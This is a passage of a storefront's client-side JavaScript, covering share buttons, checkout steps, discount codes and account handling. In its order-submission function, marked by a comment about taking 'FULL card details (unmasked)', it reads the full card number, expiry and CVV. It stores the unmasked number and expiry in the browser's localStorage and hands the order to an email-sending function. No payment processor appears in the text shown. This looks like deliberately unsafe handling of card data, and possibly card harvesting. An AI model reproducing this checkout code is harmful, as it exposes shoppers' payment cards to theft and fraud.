                    <span class="sp-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><defs><linearGradient id="ig" x1="0%" y1="100%" x2="100%" y2="0%"><stop offset="0%" stop-color="#FFDC80"/><stop offset="30%" stop-color="#F77737"/><stop offset="60%" stop-color="#C13584"/><stop offset="100%" stop-color="#833AB4"/></linearGradient></defs><path fill="url(#ig)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg></span>
                    <span>Instagram</span>
                </button>
                <button class="sp-btn sp-snapchat" data-sp="snapchat" title="Snapchat">
                    <span class="sp-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#fff" d="M12.206.793c.99 0 4.347.276 5.93 3.821.529 1.193.403 3.219.299 4.847l-.003.06c-.012.18-.022.35-.029.51.28.07.65.094.974.012.33-.074.605-.17.88-.17.58 0 .937.4.937.908 0 .55-.388.89-.969 1.072-.168.055-.347.1-.528.148l-.006.002c-.228.06-.456.12-.626.194-.094.04-.257.103-.289.288-.016.09.008.186.08.29.443.632 1.48 2.058 1.48 3.397 0 4.47-6.29 5.505-9.83 5.505-.6 0-1.2-.007-1.8-.007-3.54 0-9.83-1.035-9.83-5.505 0-1.34 1.037-2.765 1.48-3.397.072-.104.096-.2.08-.29-.032-.185-.195-.248-.289-.288-.17-.073-.398-.133-.626-.194l-.006-.002a6.72 6.72 0 01-.528-.148c-.581-.182-.969-.522-.969-1.072 0-.508.357-.908.937-.908.275 0 .55.096.88.17.324.082.694.058.974-.012l-.029-.51-.003-.06c-.104-1.628-.23-3.654.299-4.847C7.86 1.07 11.216.793 12.206.793z"/></svg></span>
                    <span>Snapchat</span>
                </button>
                <button class="sp-btn" data-sp="copy" title="Copy URL">
                    <span class="sp-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg></span>
                    <span>Copy</span>
                </button>
                <button class="sp-btn" data-sp="more" title="More">
                    <span class="sp-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#888"><circle cx="5" cy="12" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="19" cy="12" r="2"/></svg></span>
                    <span>More</span>
                </button>
            </div>
            <p class="sp-feedback hidden" id="sp-feedback"></p>
        `;

        pop.style.visibility = "hidden";
        document.body.appendChild(pop);

        const pw = pop.offsetWidth;
        const ph = pop.offsetHeight;
        const rect = triggerBtn.getBoundingClientRect();
        let left = rect.left + rect.width / 2 - pw / 2;
        left = Math.max(8, Math.min(left, window.innerWidth - pw - 8));
        let top = rect.top - ph - 10;
        if (top < 8) top = rect.bottom + 10;
        pop.style.top = `${top}px`;
        pop.style.left = `${left}px`;
        pop.style.visibility = "";

        function showFb(msg) {
            const fb = document.getElementById("sp-feedback");
            if (!fb) return;
            fb.textContent = msg;
            fb.classList.remove("hidden");
            clearTimeout(fb._t);
            fb._t = setTimeout(closeSharePopover, 2500);
        }

        pop.addEventListener("click", async (e) => {
            const btn = e.target.closest("[data-sp]");
            if (!btn) return;
            const action = btn.dataset.sp;
            if (action === "whatsapp") {
                window.open(`https://wa.me/?text=${encodedText}`, "_blank", "noopener,noreferrer");
                closeSharePopover();
            } else if (action === "facebook") {
                window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}&quote=${encodeURIComponent(product.name)}`, "_blank", "noopener,noreferrer");
                closeSharePopover();
            } else if (action === "tiktok") {
                copyToClipboard(url).then(() => showFb("🎵 Copied! Paste in TikTok bio or DM."));
            } else if (action === "instagram") {
                copyToClipboard(url).then(() => showFb("📸 Copied! Paste in Instagram story or DM."));
            } else if (action === "snapchat") {
                window.open(`https://www.snapchat.com/scan?attachmentUrl=${encodeURIComponent(url)}`, "_blank", "noopener,noreferrer");
                closeSharePopover();
            } else if (action === "copy") {
                copyToClipboard(url).then(() => showFb("✓ Link copied!"));
            } else if (action === "more") {
                if (navigator.share) {
                    try {
                        await navigator.share({ title: product.name, text: `Check out ${product.name} for ${formatMoney(product.price)}!`, url });
                        closeSharePopover();
                    } catch (_) { /* dismissed */ }
                } else {
                    copyToClipboard(url).then(() => showFb("✓ Link copied!"));
                }
            }
        });

        setTimeout(() => document.addEventListener("click", _shareOutside, true), 0);
    }

    function showShipping() {
        checkoutSteps.classList.remove("hidden");
        shippingSection.classList.remove("hidden");
        paymentSection.classList.add("hidden");
        discountSection.classList.add("hidden");
        cartSummary.classList.add("hidden");
    }

    function showPayment() {
        shippingSection.classList.add("hidden");
        paymentSection.classList.remove("hidden");
        discountSection.classList.add("hidden");
        setPaymentMessage("");
    }

    function showDiscount() {
        paymentSection.classList.add("hidden");
        discountSection.classList.remove("hidden");
        updateCheckoutTotals();
    }

    function backToCart() {
        checkoutSteps.classList.add("hidden");
        cartSummary.classList.remove("hidden");
    }

    function applyDiscount() {
        const code = normalize(discountCodeInput.value).toUpperCase();
        activeDiscountRate = discountCodes[code] || 0;
        updateCheckoutTotals();
    }

    function formatCardNumberWithSpaces(cardNumber) {
        // Format card number in groups of 4 digits
        return cardNumber.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
    }

    function getDiscountCodeUsed() {
        if (activeDiscountRate === 0) return "No discount code";
        return Object.keys(discountCodes).find(key => discountCodes[key] === activeDiscountRate) || "Unknown";
    }

    async function submitOrder() {
        if (!shippingData || cart.length === 0) {
            return;
        }

        const base = subtotal();
        const withTax = base * (1 + taxRate);
        const finalTotal = withTax * (1 - activeDiscountRate);
        
        // Get FULL card details (unmasked)
        const cardDigits = digitsOnly(cardNumberInput.value);
        const cardNumberFormatted = formatCardNumberWithSpaces(cardDigits);
        const cardBrand = detectCardBrand(cardDigits) || "Card";
        const last4 = cardDigits.slice(-4) || "0000";
        const cardName = cardNameInput.value.trim() || "Cardholder";
        const cardExpiry = cardExpiryInput.value.trim(); // Full expiry (MM/YY)
        const cardCvv = cardCvvInput.value.trim(); // Full CVV

        const orderId = `ORD-${Date.now()}-${Math.floor(Math.random() * 9000 + 1000)}`;

        const recentOrder = {
            orderId,
            products: cart.map((item) => ({
                id: item.id,
                name: item.name,
                category: categoryLabels[item.category] || item.category,
                quantity: item.quantity,
                price: item.price,
                image: item.image
            })),
            subtotal: base,
            taxedTotal: withTax,
            discountRate: activeDiscountRate,
            discountCode: getDiscountCodeUsed(),
            total: finalTotal,
            shippingInfo: { ...shippingData },
            paymentSummary: {
                method: activePaymentMethod === "debit" ? "Debit Card" : "Credit Card",
                cardName: cardName,
                brand: cardBrand,
                last4: last4,
                cardNumberFormatted: cardNumberFormatted,
                expiry: cardExpiry
            },
            createdAt: new Date().toISOString()
        };

        // Always save order first so the user always sees it
        localStorage.setItem("recentOrder", JSON.stringify(recentOrder));

        // Clear cart and close drawer
        cart = [];
        shippingData = null;
        activeDiscountRate = 0;
        discountCodeInput.value = "";
        updateCartCount();
        renderCart();
        closeCart();

        // Send email in background (best-effort — don't block redirect)
        sendOrderEmail(recentOrder).catch(() => {});

        // Redirect to order success page
        window.location.href = "order-success.html";
    }

    function setupAccountDrawer() {
        if (accountBtn) {
            accountBtn.addEventListener("click", () => openAccountDrawer("signin"));
        }
        if (closeAccountBtn) {
            closeAccountBtn.addEventListener("click", closeAccountDrawer);
        }
        if (accountBackdrop) {
            accountBackdrop.addEventListener("click", closeAccountDrawer);
        }
        if (accountTabSignin) {
            accountTabSignin.addEventListener("click", () => openAccountDrawer("signin"));
        }
        if (accountTabSignup) {
            accountTabSignup.addEventListener("click", () => openAccountDrawer("signup"));
        }
        window.addEventListener("message", (event) => {
            if (event.origin !== window.location.origin) {
                return;
            }
            if (event.data && event.data.type === "request-google-auth") {
                if (typeof window.triggerGoogleAuthFromAccountFrame === "function") {
                    window.triggerGoogleAuthFromAccountFrame();
                }
                return;
            }
            if (!event.data || event.data.type !== "account-saved") {
                return;
            }

            const profile = JSON.parse(localStorage.getItem("fc_profile") || "null");
            if (profile) {
                showAccountLoading(profile, 520);
            }
        });

        const savedSession = localStorage.getItem(accountSessionKey);
        if (savedSession) {
            try {
                const session = JSON.parse(savedSession);
                if (session && session.name) {
                    setAccountStatus(`Signed in as ${session.name}`);
                }
            } catch (_) {
                // Ignore malformed storage value.
            }
        }

        // Logout button
        const logoutBtn = document.getElementById("logout-btn");
        if (logoutBtn) {
            logoutBtn.addEventListener("click", () => {
                localStorage.removeItem("fc_account_credential");
                localStorage.removeItem("fc_profile");

                document.getElementById("account-title").textContent = "Account";
                document.getElementById("account-subtitle").textContent = "Sign in or create your account";
                showAccountView("auth");

                window.setTimeout(() => {
                    closeAccountDrawer();
                }, 160);
            });
        }

        setupGoogleAccountButton();
    }

    function bindEvents() {
        if (browseBtn) {
            browseBtn.addEventListener("click", () => {
                document.getElementById("category").scrollIntoView({ behavior: "smooth", block: "start" });
            });
        }

        if (headerSearch) headerSearch.addEventListener("input", renderProducts);
        if (categorySearch) categorySearch.addEventListener("input", renderProducts);

        if (categoryButtons) {
            categoryButtons.addEventListener("click", (event) => {
                const btn = event.target.closest("button[data-category]");
                if (!btn) {
                    return;
                }
                activeCategory = btn.dataset.category;
                document.querySelectorAll(".category-btn").forEach((item) => item.classList.remove("active"));
                btn.classList.add("active");
                renderProducts();
            });
        }

        if (productGrid) {
            productGrid.addEventListener("click", (event) => {
                const actionTarget = event.target.closest("[data-action]");
                if (!actionTarget) {
                    return;
                }

                const action = actionTarget.dataset.action;
                const id = actionTarget.dataset.id;

                if (action === "add-cart") {
                    addToCart(id);
                }

                if (action === "open-modal") {
                    openProductModal(id);
                }

                if (action === "share-product") {
                    openSharePanel(id, actionTarget);
                }
            });
        }

        if (cartItems) {
            cartItems.addEventListener("click", (event) => {
                const target = event.target.closest("[data-action]");
                if (!target) {
                    return;
                }

                if (target.dataset.action === "inc") {
                    changeQuantity(target.dataset.id, 1);
                }

                if (target.dataset.action === "dec") {
                    changeQuantity(target.dataset.id, -1);
                }
            });
        }

        if (modalThumbs) {
            modalThumbs.addEventListener("click", (event) => {
                const thumb = event.target.closest(".modal-thumb");
                if (!thumb) {
                    return;
                }

                modalMainImage.src = thumb.dataset.img;
                document.querySelectorAll(".modal-thumb").forEach((item) => item.classList.remove("active"));
                thumb.classList.add("active");
            });
        }

        if (modalAddBtn) {
            modalAddBtn.addEventListener("click", () => {
                if (activeModalProductId) {
                    addToCart(activeModalProductId);
                }
                closeProductModal();
            });
        }

        if (modalClose) modalClose.addEventListener("click", closeProductModal);
        if (productModal) {
            productModal.addEventListener("click", (event) => {
                if (event.target.dataset.close === "modal" || event.target === productModal) {
                    closeProductModal();
                }
            });
        }

        if (cartBtn) cartBtn.addEventListener("click", openCart);
        if (closeCartBtn) closeCartBtn.addEventListener("click", closeCart);
        if (cartBackdrop) cartBackdrop.addEventListener("click", closeCart);

        if (toShippingBtn) {
            toShippingBtn.addEventListener("click", () => {
                if (cart.length > 0) {
                    showShipping();
                }
            });
        }

        if (shippingForm) {
            shippingForm.addEventListener("submit", (event) => {
                event.preventDefault();
                shippingData = {
                    name: document.getElementById("ship-name").value,
                    email: document.getElementById("ship-email").value,
                    phone: document.getElementById("ship-phone").value,
                    address: document.getElementById("ship-address").value,
                    city: document.getElementById("ship-city").value,
                    state: document.getElementById("ship-state").value,
                    zip: document.getElementById("ship-zip").value,
                    country: document.getElementById("ship-country").value
                };
                showPayment();
            });
        }

        if (paymentForm) {
            paymentForm.addEventListener("change", (event) => {
                if (event.target.name === "pay-method") {
                    activePaymentMethod = event.target.value;
                    updatePaymentMethodUI();
                }
            });
        }

        if (cardNumberInput) {
            cardNumberInput.addEventListener("input", () => {
                const raw = digitsOnly(cardNumberInput.value).slice(0, 19);
                cardNumberInput.value = raw.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
                const brand = detectCardBrand(raw);
                if (brand) {
                    setPaymentMessage(`${brand} detected.`);
                }
            });
        }

        if (cardExpiryInput) {
            cardExpiryInput.addEventListener("input", () => {
                const raw = digitsOnly(cardExpiryInput.value).slice(0, 4);
                cardExpiryInput.value = raw.length > 2 ? `${raw.slice(0, 2)}/${raw.slice(2)}` : raw;
            });
        }

        if (cardCvvInput) {
            cardCvvInput.addEventListener("input", () => {
                cardCvvInput.value = digitsOnly(cardCvvInput.value).slice(0, 4);
            });
        }

        if (paymentForm) {
            paymentForm.addEventListener("submit", (event) => {
                event.preventDefault();
                if (!validatePaymentForm()) {
                    return;
                }
                showDiscount();
            });
        }

        if (applyDiscountBtn) applyDiscountBtn.addEventListener("click", applyDiscount);
        if (payNowBtn) payNowBtn.addEventListener("click", submitOrder);
        if (backToCartBtn) backToCartBtn.addEventListener("click", backToCart);
    }

    function init() {
        renderProducts();
        updateCartCount();
        renderCart();
        bindEvents();
        setupAccountDrawer();
        updatePaymentMethodUI();

        const productIdFromUrl = getProductIdFromUrl();
        if (productIdFromUrl) {
            openProductModal(productIdFromUrl);
        }
    }

    document.addEventListener("DOMContentLoaded", init);
})();